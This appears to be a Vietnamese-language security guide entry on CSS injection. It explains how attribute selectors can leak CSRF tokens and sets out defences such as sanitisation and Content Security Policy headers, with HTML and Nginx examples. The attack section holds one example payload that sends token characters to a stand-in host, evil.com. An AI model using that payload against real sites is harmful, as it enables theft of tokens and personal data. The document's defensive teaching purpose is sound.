# CSS Injection

> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-94 | **Phân loại**: Injection

## 🧱 Kiến thức Nền tảng
Cascading Style Sheets (CSS) là ngôn ngữ định kiểu dùng để thiết kế giao diện hiển thị cho các tài liệu HTML. CSS sử dụng các bộ chọn (selectors) để xác định các phần tử HTML cần áp dụng kiểu dáng. Bên cạnh các bộ chọn cơ bản theo tên thẻ, class hay ID, CSS hỗ trợ bộ chọn thuộc tính (attribute selectors) để nhắm mục tiêu các phần tử dựa trên sự hiện diện hoặc giá trị của thuộc tính của chúng. Các toán tử so khớp thuộc tính mạnh mẽ bao gồm: `[attr^=val]` (thuộc tính bắt đầu bằng `val`), `[attr$=val]` (thuộc tính kết thúc bằng `val`), và `[attr*=val]` (thuộc tính chứa chuỗi con `val`).

Mặc dù CSS không thực thi mã JavaScript trực tiếp, lỗ hổng CSS Injection vẫn cực kỳ nguy hiểm. Kẻ tấn công có thể chèn các quy tắc CSS độc hại để thay đổi giao diện trang web, hoặc sử dụng các bộ chọn thuộc tính tinh vi kết hợp với thuộc tính `background-image: url(...)` để lấy cắp dữ liệu nhạy cảm hiển thị trên trang (ví dụ: CSRF token hay số thẻ tín dụng). Khi trình duyệt tải hình ảnh nền từ một URL chỉ định trong thuộc tính nền nếu giá trị thuộc tính của thẻ khớp với bộ chọn, nó sẽ vô tình gửi giá trị đó về máy chủ của kẻ tấn công dưới dạng tham số URL. Để phòng ngừa lỗ hổng này, lập trình viên cần ngăn chặn người dùng chèn trực tiếp các đoạn mã CSS tùy ý vào thẻ `<style>` hoặc thuộc tính `style`. Tất cả đầu vào CSS từ người dùng phải được lọc sạch (sanitize) nghiêm ngặt, đồng thời thiết lập chính sách Content Security Policy (CSP) chặt chẽ để hạn chế nguồn tải CSS (`style-src 'self'`) và ngăn chặn việc tải hình ảnh nền từ các nguồn bên ngoài không đáng tin cậy (`img-src 'self'`).

```html
<!-- Secure HTML configuration with Content Security Policy (CSP) -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Normal Operation - CSP style-src and img-src</title>
    <!-- 
      The HTTP-equiv Content-Security-Policy header restricts style sources 
      and prevents external background image requests, neutralizing CSS-based exfiltration.
    -->
    <meta http-equiv="Content-Security-Policy" 
          content="default-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self';">
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <h1>Welcome to our secure application</h1>
    <!-- CSRF token stored in input element is safe from CSS selector exfiltration -->
    <input type="hidden" id="csrf-token" value="abc123xyz">
</body>
</html>
```

## 🔍 Mô tả lỗ hổng
Trong khi các cơ chế phòng thủ chèn mã thường tập trung vào JavaScript, Cascading Style Sheets (CSS) cũng đại diện cho một vectơ tấn công khả thi. Nếu các kiểu định dạng do người dùng tạo ra không được làm sạch, kẻ tấn công có thể chèn các quy tắc CSS độc hại bằng cách sử dụng các bộ chọn thuộc tính (attribute selectors) để dò tìm và lấy cắp dữ liệu nhạy cảm được hiển thị trên trang, chẳng hạn như các token chống CSRF hoặc thông tin cá nhân.

## ⚔️ Cơ chế tấn công
Kẻ tấn công chèn mã CSS chứa các bộ chọn thuộc tính như input[value^='a'] { background: url('https://evil.com/steal?token=a'); }. Nếu token CSRF trong đầu vào khớp với bộ chọn, trình duyệt sẽ tải hình ảnh nền, ghi lại ký tự khớp vào máy chủ của kẻ tấn công. Quá trình này được lặp lại một cách hệ thống để trích xuất toàn bộ token.

## 🛡️ Biện pháp phòng thủ
- **Tóm tắt**: Làm sạch đầu vào do người dùng kiểm soát, tránh tuyệt đối việc nội suy trực tiếp vào các thẻ style, và thực thi một Chính sách Bảo mật Nội dung (CSP) nghiêm ngặt.
- **Các bước chi tiết**:
  - Làm sạch và xác thực các đầu vào CSS do người dùng cung cấp để đảm bảo chúng không chứa các tham chiếu URL bên ngoài hoặc các thuộc tính nguy hiểm.
  - Thực thi Chính sách Bảo mật Nội dung (CSP) giới hạn style-src trong các tên miền đáng tin cậy và vô hiệu hóa các kiểu định dạng nội dòng không an toàn ('unsafe-inline').
  - Hiển thị các giá trị nhạy cảm (như token CSRF) bằng cách sử dụng các phần tử hoặc thuộc tính không thể bị định dạng hoặc giám sát bằng các bộ chọn thuộc tính CSS.
  - Sử dụng các tên lớp (class) và ID CSS động hoặc ngẫu nhiên cho các trường biểu mẫu nhạy cảm để ngăn chặn việc bị nhắm mục tiêu bởi các bộ chọn tĩnh.

## 💻 Code Example
```configuration
# Nginx configuration for Content Security Policy restricting CSS sources
add_header Content-Security-Policy "default-src 'self'; style-src 'self' https://fonts.googleapis.com;" always;
```

## 📚 Ghi chú kỹ thuật & Nguồn tham khảo
- **Trạng thái kiểm định**: FIXED
- **Ghi chú kỹ thuật**: Giải quyết một sự không chính xác về mặt kỹ thuật trong Slide 3 bằng cách làm rõ rằng việc chèn CSS không thể đọc trực tiếp các trường đầu vào ẩn (<input type='hidden'>) trừ khi nó buộc chúng phải hiển thị bằng cách sử dụng các thuộc tính CSS như display: block !important, vốn sẽ kích hoạt yêu cầu tải nền.
- **Nguồn tham khảo**: CWE-94 (Improper Control of Generation of Code), PortSwigger CSS Injection
